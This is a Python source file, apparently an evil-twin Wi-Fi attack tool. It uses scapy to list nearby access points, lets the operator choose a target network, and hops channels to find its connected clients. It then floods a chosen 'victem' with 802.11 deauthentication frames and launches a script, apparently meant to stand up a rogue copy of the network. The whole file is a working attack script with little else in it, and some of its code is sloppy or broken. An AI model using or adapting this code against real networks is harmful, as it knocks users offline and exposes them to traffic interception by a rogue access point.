import os
import subprocess

import prepare_conf

hiddenSSIDs = dict()
# initialize the networks dataframe that will contain all access points nearby
import pandas
from scapy.all import *
# from threading import  thread
# initialize the networks dataframe that will contain all access points nearby
from scapy.layers.dot11 import Dot11Beacon

# initialize the networks dataframe that will contain all access points nearby
networks = pandas.DataFrame(columns=["BSSID", "SSID", "BEACON", "ROW"])
# set the index BSSID (MAC address of the AP)
# networks.set_index("BSSID", inplace=True)
list_users = []
target_AP = ""


# set the index BSSID (MAC address of the AP)
# networks.set_index("BSSID", inplace=True)

channel=0
def PacketHandler(packet):
    if packet.haslayer(Dot11Beacon):
        if packet.type == 0 and packet.subtype == 8:
            if packet.addr2 in networks["BSSID"].unique():
                x = networks[networks["BSSID"] == packet.addr2].iloc[0]
                x["BEACON"] = x["BEACON"] + 4
                networks.loc[x["ROW"], "BEACON"] = int(x["BEACON"]) + 1
                # myBeacon[packet.addr2] = myBeacon[packet.addr2] + 1
            elif len(packet.info) > 0:
                list1 = [packet.addr2, packet.info.decode(), 1, len(networks)]
                networks.loc[len(networks)] = list1


def searchUsers(packet):
    if packet.haslayer(Dot11):
        # print (packet.addr1 != packet.addr3)
        if (packet.addr3 == target_AP) or packet.addr2 == target_AP or packet.addr1 == target_AP:
            if packet.addr1 != "ff:ff:ff:ff:ff:ff":
                print(packet.addr1, packet.addr2, packet.addr1)
                DS = packet.FCfield & 0x3
                to_ds = DS & 0x1 != 0
                from_ds = DS & 0x2 != 0
                print(to_ds, from_ds)
                if to_ds and packet.addr2 not in list_users:
                    l=[packet.addr2,channel]
                    list_users.append(l)


def deauth(target_mac, gateway_mac, inter, count, loop, iface, verbose=1):
    print(target_mac)
    # 802.11 frame
    # addr1: destination MAC
    # addr2: source MAC
    # addr3: Access Point MAC
    dot11 = Dot11(addr1=target_mac, addr2=gateway_mac, addr3=gateway_mac)
    # stack them up
    packet = RadioTap() / dot11 / Dot11Deauth(reason=7)
    # send the packet
    sendp(packet, count=121, iface=iface, loop=2)





def attack():
    global target_AP
    global  channel
    # interface name, check using iwconfig
    os.system("iwconfig")
    interface_sniff = input("choose interface to sniff")
    interface_route = input("choose interface to route")

    # start sniffing
    print("Start sniff AP")
    sniff(prn=PacketHandler, iface=interface_sniff, timeout=10)
    print(networks)
    line = int(input("Choose line to attack"))
    target_AP = networks.iloc[line]["BSSID"]
    AP_name=networks.iloc[line]["SSID"]
    # wlan_name=networks.loc(line)["BSSID"]
    # print(f'start search users from {wlan_name}')
    print("start sniff client")
    for i in range(14):
        os.system("iwconfig " + interface_sniff + "channel" + str(i))
        channel=i
        sniff(prn=searchUsers, iface=interface_sniff, timeout=3)
    print(list_users)
    victem = input("Choose user to attack")
    deauth(victem, target_AP, 0.1, 1000, 1, interface_sniff, 1)
    subprocess.call(['open', '-W', '-a', 'Terminal.app', 'python', '--args', 'prepare_conf.py'])
    # prepare_conf.make_new_af(interface_route,AP_name)

